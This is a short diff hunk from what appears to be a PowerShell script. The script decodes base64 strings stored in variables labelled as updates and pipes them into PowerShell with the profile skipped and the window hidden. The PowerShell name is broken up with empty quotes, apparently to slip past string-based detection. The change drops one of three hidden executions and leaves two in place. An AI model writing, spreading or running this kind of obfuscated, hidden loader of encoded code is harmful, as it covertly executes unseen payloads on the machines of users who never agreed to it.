@@ -17,6 +17,6 @@ $update_p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64
 $update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
 $update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))
 
-echo $update_a1 | pow""ersh""ell -nop -windowstyle hidden - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden - ;echo $update_d1 | pow""e""rsh""ell -nop -windowstyle hidden -
+echo $update_a1 | pow""ersh""ell -nop -windowstyle hidden - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden - 
 
 
